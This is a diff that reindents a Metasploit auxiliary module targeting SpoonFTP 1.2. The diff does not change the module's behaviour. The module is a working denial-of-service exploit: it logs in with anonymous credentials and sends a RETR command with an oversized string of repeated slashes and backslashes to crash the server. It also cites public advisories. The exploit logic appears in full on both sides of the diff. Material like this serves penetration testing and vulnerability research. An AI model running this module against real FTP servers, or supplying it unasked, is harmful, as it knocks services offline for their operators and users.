@@ -13,45 +13,45 @@ require 'msf/core'
 
 class Metasploit3 < Msf::Auxiliary
 
-		include Msf::Exploit::Remote::Ftp
-		include Msf::Auxiliary::Dos
+    include Msf::Exploit::Remote::Ftp
+    include Msf::Auxiliary::Dos
 
-		def initialize(info = {})
-			super(update_info(info,
-				'Name' => 'SpoonFTP <= 1.2 RETR Denial Of Service',
-				'Description' => %q{
-				This Module exploits a bug found in SpoonFTP 1.2
-				of the Denial of Service that occurs when the spooftp receives
-				a malformed command RETR it calls the function "AppendQueue()" 
-				which causes a READ VIOLATION the movement of a string.
-				},
-				'Author' => "C4SS!0 G0M3S",
-				'License'        => MSF_LICENSE,
-				'Version'        => '$Revision$',
-				
-				'References' =>
-				[	
-					['URL','http://packetstormsecurity.org/files/99466/SpoonFTP-1.2-Denial-Of-Service.html'],
-					['URL','http://www.exploit-db.com/exploits/17021/'],
-					['URL','http://www.securityfocus.com/bid/46952'],
-				],
-				'DisclosureDate' => 'Apr 03 2011'))
-		
-		register_options([
-			OptString.new('FTPUSER', [ true, 'Valid FTP username', 'anonymous' ]),
-			OptString.new('FTPPASS', [ true, 'Valid FTP password for username', 'anonymous' ])
-		])
+    def initialize(info = {})
+      super(update_info(info,
+        'Name' => 'SpoonFTP <= 1.2 RETR Denial Of Service',
+        'Description' => %q{
+        This Module exploits a bug found in SpoonFTP 1.2
+        of the Denial of Service that occurs when the spooftp receives
+        a malformed command RETR it calls the function "AppendQueue()" 
+        which causes a READ VIOLATION the movement of a string.
+        },
+        'Author' => "C4SS!0 G0M3S",
+        'License'        => MSF_LICENSE,
+        'Version'        => '$Revision$',
+        
+        'References' =>
+        [	
+          ['URL','http://packetstormsecurity.org/files/99466/SpoonFTP-1.2-Denial-Of-Service.html'],
+          ['URL','http://www.exploit-db.com/exploits/17021/'],
+          ['URL','http://www.securityfocus.com/bid/46952'],
+        ],
+        'DisclosureDate' => 'Apr 03 2011'))
+    
+    register_options([
+      OptString.new('FTPUSER', [ true, 'Valid FTP username', 'anonymous' ]),
+      OptString.new('FTPPASS', [ true, 'Valid FTP password for username', 'anonymous' ])
+    ])
      end
 
-	def run
-		connect_login
-		print_status("Sending Exploit Denial of Service...")
-		exploit = "/\\" * (6000/3)
-		send_cmd(['RETR',exploit],true)
-		print_status("Submitted Exploit Success;-)")
-		handler
-		disconnect
-	end
+  def run
+    connect_login
+    print_status("Sending Exploit Denial of Service...")
+    exploit = "/\\" * (6000/3)
+    send_cmd(['RETR',exploit],true)
+    print_status("Submitted Exploit Success;-)")
+    handler
+    disconnect
+  end
 end
 
 
